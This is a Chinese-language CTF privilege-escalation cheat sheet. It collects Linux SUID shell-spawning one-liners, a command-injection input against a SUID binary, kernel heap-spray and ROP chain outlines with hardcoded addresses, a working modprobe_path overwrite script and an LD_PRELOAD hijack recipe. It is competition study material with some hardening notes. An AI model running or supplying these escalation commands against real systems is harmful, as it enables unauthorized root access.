# 提权方法总结

## 总览

> **用途**: 网络安全比赛（CTF / 渗透 / AWD / 内网靶场）中的提权（Privilege Escalation）方法速查。\
> **来源**: 本地赛事资料整理。
> **定位**: getshell 之后，把低权限 shell 提升为 root / SYSTEM / 域管 / 集群权限。\
> **关联**: [Web 漏洞 Getshell 总索引](web漏洞getshell/README.md)（提权在整体流程中的位置）

***

## 零、总览

| 平台 | 提权大类 | 代表方法 | 难度 |
| --- | --- | --- | --- |
| **Linux** | SUID / sudo / 内核 / 环境变量 / 配置错误 | GTFObins、commit\_creds、LD\_PRELOAD | 低→高 |
| **Windows** | Potato 系 / 内核 / 服务配置 | SweetPotato、MS17-010、xp\_cmdshell | 低→中 |
| **数据库** | UDF / 存储过程 / Java | MySQL UDF、Oracle Java Source | 中 |
| **容器 / K8s** | core\_pattern / 挂载 / RBAC | 逃逸到宿主机 | 中→高 |
| **域（AD）** | 票据 / 委派 / 证书 | DCSync、黄金票据、AD CS | 高 |
| **云** | API 滥用 | CVM 改密、AK/SK | 中 |

**提权前的第一句话永远是**：`whoami` / `id` / `whoami /priv`（Windows）

## 一、Linux 提权

### 1.1 SUID 提权（GTFObins 系）★★

```bash
# 第一步: 找 SUID
find / -user root -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
# ls -lh 看到的 rwsr-xr-x 中 s 位即 SetUID
```

| SUID 程序 | 利用命令 | 出处 |
| --- | --- | --- |
| **nmap（老版本）** | `nmap --interactive` → `!sh` | 2022 蓝帽杯 SUID 提权 |
| **sudo nmap + lua** | `echo "os.execute('/bin/sh')" > /tmp/shell.nse` + `sudo nmap --script=/tmp/shell.nse` | 同上 |
| **find** | `find / -exec whoami \;` / `find . -exec /bin/sh \;` | 同上 |
| **date** | `date -f /flag`（报错打印文件内容） | 同上 |
| **ftp（SHELL 劫持）** | `putenv("SHELL=/usr/bin/od")` → ftp 触发 shell 时走 od | 同上 |
| **7z + tar** | `/usr/bin/7z a -ttar -an -so /flag 2>/dev/null | /bin/tar -xOf -` | 软件系统安全赛 Thymeleaf |
| **vim** | `vim -c ':!/bin/sh'` | 上海大学生赛磐石行动 |
| **zsh** | SUID zsh 提权 | 同上 |
| **python3.8** | `python3.8 -c 'import os; os.system("/bin/sh")'` | 数信杯 |
| **chromium** | chromium zsh SUID 提权 | ACTF2026 |

**SUID 程序自身漏洞**（PWN 视角，`PWN入门：偷吃特权-SetUID.meta.md`）：

```bash
# 自定义 SUID 程序存在命令注入时
./set_uid_example "233333 ; /bin/sh"     → root shell
./set_uid_example "233333 && /bin/sh"
```

**SUID 内核原理**：

```plain
struct cred 含 8 个 ID: uid/gid/suid/sgid/euid/egid/fsuid/fsgid
mode & S_ISUID 触发 bprm->cred->euid = uid（i_uid_into_mnt）
→ search_binary_handler → load_elf_binary → bprm_fill_uid
→ security_bprm_creds_from_file → begin_new_exec → commit_creds
```

> 注意：挂载点 `SB_NOSUID` 标志置位时，SUID 位被忽略。

**参考**: [GTFObins](https://gtfobins.github.io/) — 所有 SUID/sudo 程序的利用方式。

### 1.3 内核提权（Kernel Exploit）★

**标准目标**：`commit_creds(prepare_kernel_cred(0))` + `swapgs_restore_regs_and_return_to_usermode`

#### 1.3.1 堆喷三结构（最主流）★★

```plain
msg_msg（0x30 头部 + 可控大小）+ sk_buff（320 字节头）+ pipe_buffer
```

| 步骤 | 内容 |
| --- | --- |
| 1 | 堆喷 `msg_msg` 主从消息队列 |
| 2 | 构造 UAF，堆喷 `sk_buff` 定位 victim |
| 3 | 堆喷 `sk_buff` 伪造辅助消息，泄露 UAF obj 地址 |
| 4 | 堆喷 `pipe_buffer`，泄内核基址（`pipe_buf_operations`） |
| 5 | 伪造 `pipe_buffer`，构造 ROP，劫持 `ops->release` → RIP |

**关键地址**：

```plain
PREPARE_KERNEL_CRED = 0xffffffff810d2ac0
COMMIT_CREDS        = 0xffffffff810d25c0
ANON_PIPE_BUF_OPS   = 0xffffffff8203fe40
POP_RDI_RET         = 0xffffffff810938f0
```

出处: `利用msg-msg结构体进行提权.meta.md`（D3CTF d3kheap）、`2022网鼎杯玄武组.meta.md`

#### 1.3.2 KASLR 绕过

| 方法 | 说明 | 出处 |
| --- | --- | --- |
| **cpu\_entry\_area** | `ioctl(0x5555, 0xfffffe0000000000+4)` 泄内核 text 段地址 | CVE-2023-3640 |
| **pipe\_buffer** | 泄 `pipe_buf_operations` 指针 | 三结构法 |
| **msg\_msg OOB** | 改 `m_ts` 越界读 | 同上 |

**cpu\_entry\_area 提权链（CVE-2023-3640）**：

```plain
ioctl(0x5555) 泄地址 → kernel_base = addr - 0x1008e00
→ 算 init_cred / commit_cred / pop_rdi / swapgs 偏移
→ 父进程 fork + PTRACE_TRACEME + SIGSTOP
→ PTRACE_POKEUSER 设 dr0 = mmap(0x0a000000)，dr7 = 0xf0101
→ PTRACE_CONT 触发断点，CPU 寄存器写到 mmap 区域
→ 寄存器填 r13=init_cred, r12=commit_cred, rbp=swapgs, r10=getshell
→ 子进程 mov rdi,[rsi] 触发硬件断点 → 走 ROP
→ ioctl(0x6666) 改内核栈迁移 → getRootShell
```

#### 1.3.3 modprobe\_path 覆盖

```bash
echo '#!/bin/sh' > /tmp/x
echo 'chmod 777 /flag' >> /tmp/x
chmod +x /tmp/x
echo -ne '\xff\xff\xff\xff' > /tmp/dummy
/tmp/dummy        # 触发 modprobe → root 执行 /tmp/x
```

出处: `N1CTF2022 Praymoon`、`UKFC2024 CISCN`、`第五届 RealWorldCTF`

> 防御：`CONFIG_STATIC_USERMODEHELPER=y` 可阻断。

#### 1.3.4 其它内核漏洞

| CVE / 技巧 | 手法 | 出处 |
| --- | --- | --- |
| **CVE-2021-4034 (PwnKit)** | polkit pkexec 提权 | 第五届 RealWorldCTF |
| **CVE-2022-0847 (Dirty Pipe)** | 页缓存写入 | 天穹 Copy\_Fail |
| **Copy Fail (CVE-2026-31431)** | 页缓存漏洞 | Copy\_Fail 深度研究 |
| **Dirty Pagetable** | 页表操作 | m0leCon Finals 2023 |
| **stack pivot** | `push rsi; jmp [rsi+0x41]` → `pop rsp; add rsp,0x68` | N1CTF2022 Praymoon |

**内核 hardening 对抗**（Praymoon 环境）：

```plain
CONFIG_SLAB_FREELIST_RANDOM / HARDENED / SHUFFLE_PAGE_ALLOCATOR
CONFIG_STATIC_USERMODEHELPER (阻 modprobe_path) / DEBUG_LIST / HARDENED_USERCOPY
echo 1 > /proc/sys/kernel/kptr_restrict   # 禁 kptr 泄露
echo 1 > /proc/sys/kernel/dmesg_restrict
chmod 400 /proc/kallsyms                  # 符号表不可读
```

### 1.4 环境变量劫持

| 方式 | 说明 | 出处 |
| --- | --- | --- |
| **SHELL 劫持** | `putenv("SHELL=/usr/bin/od")` → 程序 `getenv("SHELL")` + `execl` | 2022 蓝帽杯 |
| **PATH 劫持** | 程序用相对路径调命令 → 改 PATH 指向恶意同名程序 | 通用 |
| **LD\_PRELOAD** | 劫持 `.so`（**也是绕 PHP **`disable_functions`** 的方法**） | `命令执行.md` L1746 |

```c
// 编译恶意 .so 劫持 execve
#define _GNU_SOURCE
#include <stdlib.h>
void __attribute__((constructor)) init() { /* payload */ }
```

```bash
gcc -shared -fPIC evil.c -o evil.so
LD_PRELOAD=./evil.so /usr/bin/target_program
```

> 注意：LD\_PRELOAD 对 SUID 程序无效（被 ld.so 忽略），对普通程序有效。
